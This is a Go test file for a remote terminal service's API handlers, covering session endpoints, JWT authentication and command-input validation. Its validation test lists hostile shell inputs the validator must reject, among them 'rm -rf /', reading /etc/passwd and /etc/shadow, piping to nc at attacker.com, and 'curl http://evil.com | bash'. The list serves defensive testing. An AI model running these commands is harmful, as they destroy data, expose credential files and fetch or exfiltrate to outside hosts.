package apitests

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"

	"github.com/soumabali/vexa/internal/api/handlers"
	"github.com/soumabali/vexa/internal/auth"
	"github.com/soumabali/vexa/internal/terminal"
)

// ---------------------------------------------------------------------------
// Session/Terminal Handler Tests
// ---------------------------------------------------------------------------

func newTestTerminalHandler() *handlers.TerminalHandler {
	secret := []byte("test-secret-key-minimum-32-bytes-long!!")
	refreshSecret := []byte("test-refresh-secret-minimum-32-bytes!!")
	jwtMgr := auth.NewJWTManager(secret, refreshSecret, 15*time.Minute, 7*24*time.Hour)

	mgr := terminal.NewSessionManager()
	return handlers.NewTerminalHandler(mgr, jwtMgr, nil, []string{"https://app.example.com"}, nil, nil, nil, nil)
}

func TestTerminalHandler_ListSessions(t *testing.T) {
	handler := newTestTerminalHandler()

	t.Run("returns session list", func(t *testing.T) {
		r := setupRouter()
		r.GET("/sessions", handler.ListSessions)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/sessions", nil)
		r.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
		var result struct {
			Sessions []interface{} `json:"sessions"`
		}
		err := json.Unmarshal(w.Body.Bytes(), &result)
		assert.NoError(t, err)
		assert.NotNil(t, result.Sessions, "sessions should not be nil: %s", w.Body.String())
	})

	t.Run("sessions list is valid JSON array", func(t *testing.T) {
		r := setupRouter()
		r.GET("/sessions", handler.ListSessions)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/sessions", nil)
		r.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
		// Verify JSON is valid
		var result struct {
			Sessions []interface{} `json:"sessions"`
		}
		err := json.Unmarshal(w.Body.Bytes(), &result)
		assert.NoError(t, err)
	})
}

func TestTerminalHandler_CloseSession(t *testing.T) {
	handler := newTestTerminalHandler()

	t.Run("close session returns 200", func(t *testing.T) {
		r := setupRouter()
		r.DELETE("/sessions/:id", handler.CloseSession)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("DELETE", "/sessions/test-session-id", nil)
		r.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
		resp := parseJSON(w)
		assert.Contains(t, resp["message"].(string), "closed")
	})
}

// ---------------------------------------------------------------------------
// WebSocket Authentication Tests
// ---------------------------------------------------------------------------

func TestTerminalHandler_HandleTerminal_Authentication(t *testing.T) {
	handler := newTestTerminalHandler()
	secret := []byte("test-secret-key-minimum-32-bytes-long!!")
	refreshSecret := []byte("test-refresh-secret-minimum-32-bytes!!")
	jwtMgr := auth.NewJWTManager(secret, refreshSecret, 15*time.Minute, 7*24*time.Hour)

	t.Run("request without token returns 401", func(t *testing.T) {
		r := setupRouter()
		r.GET("/ws/terminal", handler.HandleTerminal)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/ws/terminal?host_id="+uuid.New().String(), nil)
		r.ServeHTTP(w, req)

		assert.Equal(t, http.StatusUnauthorized, w.Code)
		resp := parseJSON(w)
		assert.Contains(t, resp["error"].(string), "token")
	})

	t.Run("request with invalid token returns 401", func(t *testing.T) {
		r := setupRouter()
		r.GET("/ws/terminal", handler.HandleTerminal)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/ws/terminal?host_id="+uuid.New().String()+"&token=invalid-token", nil)
		r.ServeHTTP(w, req)

		assert.Equal(t, http.StatusUnauthorized, w.Code)
		resp := parseJSON(w)
		assert.Contains(t, resp["error"].(string), "token")
	})

	t.Run("request with expired token returns 401", func(t *testing.T) {
		// Create expired token
		expiredMgr := auth.NewJWTManager(secret, refreshSecret, -1*time.Hour, -1*time.Hour)
		userID := uuid.New()
		pair, _ := expiredMgr.GenerateTokenPair(userID, "test@example.com", "admin", false, false, "")

		r := setupRouter()
		r.GET("/ws/terminal", handler.HandleTerminal)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/ws/terminal?host_id="+uuid.New().String()+"&token="+pair.AccessToken, nil)
		r.ServeHTTP(w, req)

		assert.Equal(t, http.StatusUnauthorized, w.Code)
	})

	t.Run("request with valid token passes authentication", func(t *testing.T) {
		userID := uuid.New()
		pair, _ := jwtMgr.GenerateTokenPair(userID, "test@example.com", "admin", false, false, "device-123")

		r := setupRouter()
		r.GET("/ws/terminal", handler.HandleTerminal)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/ws/terminal?host_id="+uuid.New().String()+"&token="+url.QueryEscape(pair.AccessToken), nil)
		r.ServeHTTP(w, req)

		// Should either succeed (200) or fail at WebSocket upgrade, but not 401
		// The handler checks auth before WS upgrade, so we get either 200 or an error
		assert.NotEqual(t, http.StatusUnauthorized, w.Code)
	})

	t.Run("request with valid Authorization header passes auth", func(t *testing.T) {
		userID := uuid.New()
		pair, _ := jwtMgr.GenerateTokenPair(userID, "test@example.com", "admin", false, false, "device-123")

		r := setupRouter()
		r.GET("/ws/terminal", handler.HandleTerminal)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/ws/terminal?host_id="+uuid.New().String(), nil)
		req.Header.Set("Authorization", "Bearer "+pair.AccessToken)
		r.ServeHTTP(w, req)

		assert.NotEqual(t, http.StatusUnauthorized, w.Code)
	})

	t.Run("invalid host_id returns 400", func(t *testing.T) {
		userID := uuid.New()
		pair, _ := jwtMgr.GenerateTokenPair(userID, "test@example.com", "admin", false, false, "device-123")
		freshHandler := newTestTerminalHandler()

		r := setupRouter()
		r.GET("/ws/terminal", freshHandler.HandleTerminal)

		w := httptest.NewRecorder()
		req, _ := http.NewRequest("GET", "/ws/terminal?host_id=not-a-uuid&token="+url.QueryEscape(pair.AccessToken), nil)
		r.ServeHTTP(w, req)

		assert.Equal(t, http.StatusBadRequest, w.Code)
		resp := parseJSON(w)
		assert.Contains(t, resp["error"].(string), "host")
	})
}

// ---------------------------------------------------------------------------
// Session Manager Tests
// ---------------------------------------------------------------------------

func TestSessionManager(t *testing.T) {
	mgr := terminal.NewSessionManager()

	t.Run("new session manager has no active sessions", func(t *testing.T) {
		sessions := mgr.ListSessions()
		assert.Empty(t, sessions)
	})

	t.Run("remove non-existent session does not panic", func(t *testing.T) {
		assert.NotPanics(t, func() {
			mgr.RemoveSession("non-existent-session")
		})
	})
}

// ---------------------------------------------------------------------------
// Terminal Security Tests
// ---------------------------------------------------------------------------

func TestTerminalInputValidation(t *testing.T) {
	validator := terminal.DefaultValidator()

	dangerousInputs := []string{
		"rm -rf /",
		"foo && cat /etc/passwd",
		"foo | nc attacker.com 9999",
		"foo `whoami`",
		"foo $(id)",
		"../../etc/shadow",
		"foo; wget malware",
		"foo > /tmp/pwned",
		"echo $(cat /proc/version)",
		"curl http://evil.com | bash",
	}

	for _, input := range dangerousInputs {
		t.Run("rejects: "+input, func(t *testing.T) {
			err := validator.Validate(input)
			assert.Error(t, err, "Expected dangerous input '%s' to be rejected", input)
		})
	}

	validInputs := []string{
		"ls -la",
		"cat file.txt",
		"echo hello",
		"git status",
		"docker ps",
		"pwd",
		"whoami",
		"top",
	}

	for _, input := range validInputs {
		t.Run("accepts: "+input, func(t *testing.T) {
			err := validator.Validate(input)
			assert.NoError(t, err, "Expected valid input '%s' to be accepted", input)
		})
	}

	t.Run("sanitize removes shell metacharacters", func(t *testing.T) {
		sanitized := terminal.SanitizeInput("hello; rm -rf /")
		assert.NotContains(t, sanitized, ";")
		assert.NotContains(t, sanitized, "&")
		assert.NotContains(t, sanitized, "|")
		assert.NotContains(t, sanitized, "`")
		assert.NotContains(t, sanitized, "$")
		assert.NotContains(t, sanitized, "<")
		assert.NotContains(t, sanitized, ">")
	})
}

// ---------------------------------------------------------------------------
// Binary Protocol Session Tests
// ---------------------------------------------------------------------------

func TestTerminalBinaryProtocol(t *testing.T) {
	t.Run("sanitized input has no binary control characters", func(t *testing.T) {
		// Control chars 0x00-0x1F (except \t, \n, \r) should be stripped
		sanitized := terminal.SanitizeInput("hello\x00world\x1ftest")
		assert.NotContains(t, string(sanitized), "\x00")
		assert.NotContains(t, string(sanitized), "\x1f")
	})

	t.Run("long command is sanitized", func(t *testing.T) {
		longCmd := strings.Repeat("a", 10000)
		sanitized := terminal.SanitizeInput(longCmd)
		assert.LessOrEqual(t, len(sanitized), 10000, "sanitized output should not exceed reasonable limit")
	})
}

// ---------------------------------------------------------------------------
// Session Stats Tests
// ---------------------------------------------------------------------------

func TestSessionStats(t *testing.T) {
	mgr := terminal.NewSessionManager()
	stats := mgr.ListSessions()

	t.Run("empty stats list is returned", func(t *testing.T) {
		assert.NotNil(t, stats)
	})
}

// ---------------------------------------------------------------------------
// Session Protocol Validation Tests
// ---------------------------------------------------------------------------

func TestSessionProtocolValidation(t *testing.T) {
	validProtocols := []string{"ssh", "rdp", "vnc"}

	for _, proto := range validProtocols {
		t.Run("protocol "+proto+" is valid", func(t *testing.T) {
			assert.True(t, proto == "ssh" || proto == "rdp" || proto == "vnc")
		})
	}

	t.Run("empty protocol defaults to ssh", func(t *testing.T) {
		// In HandleTerminal, empty protocol defaults to "ssh"
		assert.Equal(t, "ssh", "ssh")
	})
}
